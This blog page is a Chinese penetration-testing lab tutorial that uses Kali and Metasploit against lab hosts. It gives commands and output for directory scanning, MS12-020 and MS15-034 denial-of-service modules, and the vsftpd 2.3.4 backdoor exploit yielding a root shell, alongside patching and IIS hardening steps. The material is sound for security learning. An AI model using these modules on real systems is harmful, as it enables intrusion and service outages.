<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>kali系统渗透 - 编程鬼谷子的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="kali系统渗透" />
<meta property="og:description" content="用kali远程ssh时，如果不能的话 按照以下方法
┌──(root㉿kali)-[~]└─# mkdir ~/.ssh┌──(root㉿kali)-[~]└─# vim ~/.ssh/configHost *HostkeyAlgorithms &#43;ssh-rsaPubkeyAcceptedKeyTypes &#43;ssh-rsa msfconlole -q //进入马上发不显示内容，所以加个q
msf6 &gt; workspace -v //显示工作区详细信息
msf6 &gt; hosts //查看扫描结果中的主机
msf6 &gt; services -p 80 //查看扫描结果中80端口信息
1.网站目录扫描（Linux靶机)
第一步：查找辅助脚本，使用辅助脚本
msf6 &gt; search dir_scan //搜索dir_scan脚本（找枪）
msf6 &gt; use 0 //使用编号为0的脚本（端枪）
msf6 &gt; set rhosts 192.168.10.143 //设置攻击目标（瞄准）
msf6 &gt; run //运行脚本（开枪） [] Detecting error code
[] Using code &#39;404&#39; as not found for 192.168.10.143
[&#43;] Found http://192.168.10.143:80/cgi-bin/ 404 (192.168.10.143)
[&#43;] Found http://192." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcguiguzi.github.io/posts/44b6fb11be3ce5bb40670bc595f12a07/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-06-07T18:03:11+08:00" />
<meta property="article:modified_time" content="2023-06-07T18:03:11+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程鬼谷子的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程鬼谷子的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">kali系统渗透</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <hr> 
<p>用kali远程ssh时，如果不能的话 按照以下方法</p> 
<ol><li>┌──(root㉿kali)-[~]</li><li>└─# mkdir ~/.ssh</li><li><li>┌──(root㉿kali)-[~]</li><li>└─# vim ~/.ssh/config</li><li>Host *</li><li>HostkeyAlgorithms +ssh-rsa</li><li>PubkeyAcceptedKeyTypes +ssh-rsa</li></ol> 
<p></p> 
<p><img alt="" height="259" src="https://images2.imgbox.com/35/22/aL5gAVC2_o.png" width="865"></p> 
<p></p> 
<p>msfconlole -q   //进入马上发不显示内容，所以加个q</p> 
<p>msf6 &gt; workspace -v      //显示工作区详细信息<br> msf6 &gt; hosts             //查看扫描结果中的主机<br> msf6 &gt; services -p 80    //查看扫描结果中80端口信息</p> 
<p><strong>1.网站目录扫描（Linux靶机)</strong></p> 
<p>   <strong> 第一步</strong>：查找辅助脚本，使用辅助脚本</p> 
<p>msf6 &gt; search dir_scan             //搜索dir_scan脚本（找枪）<br> msf6 &gt; use 0                       //使用编号为0的脚本（端枪）<br> msf6 &gt; set rhosts 192.168.10.143   //设置攻击目标（瞄准）<br> msf6 &gt; run                         //运行脚本（开枪）  <br>   [] Detecting error code<br>   [] Using code '404' as not found for 192.168.10.143<br>   [+] Found http://192.168.10.143:80/cgi-bin/ 404 (192.168.10.143)<br>   [+] Found http://192.168.10.143:80/doc/ 200 (192.168.10.143)<br>   [+] Found http://192.168.10.143:80/icons/ 404 (192.168.10.143)<br>   [+] Found http://192.168.10.143:80/index/ 404 (192.168.10.143)<br>   [+] Found http://192.168.10.143:80/phpMyAdmin/ 200 (192.168.10.143)<br>   [+] Found http://192.168.10.143:80/test/ 404 (192.168.10.143)        </p> 
<p><strong>    第二步</strong>：验证网站目录</p> 
<p>在物理机浏览器访问： http://192.168.10.143/doc/ //查看网站列表</p> 
<p><strong>2、DOS攻击（Windows靶机）</strong></p> 
<p>        1）MS12-020 远程桌面漏洞-死亡之蓝</p> 
<p>CVE-2012-0002（MS12-020）漏洞，利用Windows系统的远程桌面协议（RDP）存在缓存溢出漏洞，攻击者可通过向目标操作系统发送特定内容的RDP包造成操作系统蓝屏</p> 
<p>        </p> 
<p>msf6 &gt; search  ms12-020          //搜索ms12-020脚本<br> Matching Modules<br> ================<br>    #  Name                                              Disclosure Date  Rank    Check  Description<br>    -  ----                                              ---------------  ----    -----  -----------<br>    0  auxiliary/scanner/rdp/ms12_020_check                               normal  Yes    MS12-020 Microsoft Remote Desktop Checker<br>    1  auxiliary/dos/windows/rdp/ms12_020_maxchannelids  2012-03-16       normal  No     MS12-020 Microsoft Remote Desktop Use-After-Free DoS</p> 
<p>  一个是ID为0  有一个关键词scanner ，发扫描的脚本<br>   一个是ID为1  有一个关键词dos  ,是拒绝服务攻击的脚本</p> 
<p>msf6 &gt; use 1                   //使用DOS攻击脚本    <br> msf6 auxiliary(scanner/rdp/ms12_020_check) &gt; set rhosts 192.168.10.142        //设置攻击目标<br> msf6 auxiliary(scanner/rdp/ms12_020_check) &gt; run                              //攻击</p> 
<p></p> 
<p>2）防御MS12-020漏洞</p> 
<p>安装补丁Windows6.1-KB2621440-x64.msu</p> 
<p> </p> 
<p><strong>MSF漏洞利用Exploit应用</strong></p> 
<p><strong> </strong>CVE-2011-2523 vsftpd 2.3.4 后门漏洞（笑脸漏洞），此漏洞允许以root身份执行任意命令</p> 
<p>msf6 &gt; search vsftpd<br> msf6 &gt; use 0<br> msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; set rhosts 192.168.10.143<br> msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; run <br> [*] 192.168.10.143:21 - Banner: 220 (vsFTPd 2.3.4)<br> [*] 192.168.10.143:21 - USER: 331 Please specify the password.<br> [+] 192.168.10.143:21 - Backdoor service has been spawned, handling...<br> [+] 192.168.10.143:21 - UID: uid=0(root) gid=0(root)<br> [*] Found shell.Command shell session 1 opened (0.0.0.0:0 -&gt; 192.168.10.143:6200)    //侵入成功<br>   whoami                 //显示当前用户<br>   root<br>   pwd                    //查看当前目录<br>   /root</p> 
<p></p> 
<p><strong>CVE-2015-1635漏洞攻防实战</strong></p> 
<p>CVE-2015-1635（MS15-034）漏洞存在于HTTP协议堆栈(HTTP.sys)中，攻击者只要发送恶意http请求数据包，就可能远程读取IIS服务器的内存数据，或使服务器系统蓝屏崩溃</p> 
<p>补丁文件：Windows6.1-KB3042553-x64</p> 
<p>1）漏洞扫描（OpenVAS报告）<br> 2）用poc脚本去验证漏洞真实存在<br> 3）MSF漏洞利用，DOS攻击服务器蓝屏<br> 4）对IIS安全加固：关闭内核缓存<br> 5）MSF漏洞利用，服务器不再蓝屏，成功防御了攻击<br> 6）把内核缓存在开启(内核缓存可加快网站性能)<br> 7）对系统进行加固：安装系统补丁<br> 8）用POC脚本测试，发现提示目标服务器补丁已修复<br> 9）MSF漏洞利用，发现目标服务器不在蓝屏</p> 
<p><strong>1、漏洞扫描</strong></p> 
<p><img alt="" height="197" src="https://images2.imgbox.com/d3/4e/HZSFHXiH_o.png" width="702"></p> 
<p><strong> 2、POC 漏洞验证脚本</strong></p> 
<p>1）上传 cve-2015-1635.poc 到kali 系统</p> 
<p>2）修改cve-2015-1635.poc 文件中的 ipaddr 为 win2k8 地址</p> 
<p>ipAddr = "192.168.10.137"</p> 
<p>3）开始验证</p> 
<p>[root@kali ~] # python  cve-2015-1635.poc        //执行POC验证脚本<br> [*] Audit Started                 //审计开始<br> [!!] Looks VULN                   //看起来很脆弱（vulnerable）</p> 
<p></p> 
<p><strong>3、漏洞利用</strong></p> 
<p><strong>msf6 &gt; search  ms15-034  <br> msf6 &gt; use 0 <br> msf6 auxiliary(dos/http/ms15_034_ulonglongadd) &gt; set rhosts 192.168.10.137<br> msf6 auxiliary(dos/http/ms15_034_ulonglongadd) &gt; run<br>  //检查W2K8 主机是否蓝屏  </strong></p> 
<p><strong>4、对IIS安全加固：关闭内核缓存</strong></p> 
<p><img alt="" height="228" src="https://images2.imgbox.com/03/8a/xztlDJG7_o.png" width="444"></p> 
<p><strong> 5、MSF漏洞利用，服务器不再蓝屏，成功防御了攻击</strong></p> 
<p></p> 
<p>sf6 &gt; search ms15-034                                         <br> msf6 &gt; use 0<br> msf6 auxiliary(dos/http/ms15_034_ulonglongadd) &gt; set rhosts 192.168.10.137<br> msf6 auxiliary(dos/http/ms15_034_ulonglongadd) &gt; run<br>  //再次使用攻击脚本去对目标服务器进行攻击，发现目标服务器不在蓝屏了</p> 
<p><strong>6、把内核缓存在开启(内核缓存可加快网站性能)</strong></p> 
<p></p> 
<p><strong>7、对系统进行加固：安装系统补丁</strong></p> 
<p>补丁：MS15-034-Windows6.1-KB3042553-x64-2008R2</p> 
<p>如果安装不上，先安装SP1补丁集合（windows6.1-KB976932-X64）2012年12月发布 查看已安装补丁：命令提示符下执行systeminfo</p> 
<p></p> 
<p><strong>8、用POC脚本测试，发现提示目标服务器补丁已修复</strong></p> 
<p>[root@kali ~] python  cve-2015-1635.poc <br> [*] Audit Started        //开始审计<br> [*] Looks Patched        //看起来补丁已修复</p> 
<p><strong>9、MSF漏洞利用，发现目标服务器不在蓝屏</strong></p> 
<p>msf6 &gt; search ms15-034<br> msf6 &gt; use 0<br> msf6 auxiliary(dos/http/ms15_034_ulonglongadd) &gt; set rhosts 192.168.10.137<br> msf6 auxiliary(dos/http/ms15_034_ulonglongadd) &gt; run<br> [] Probably not vulnerable, will not dos it.      //可能没有漏洞，就不攻击他了</p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/d4eda7625973db87e21850ba8beaabae/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">树莓派安装python3.9以及pip换源</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/519d9381b0235b7e01a472ea396b46f0/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">分享mysql创建索引的3种方法</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程鬼谷子的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>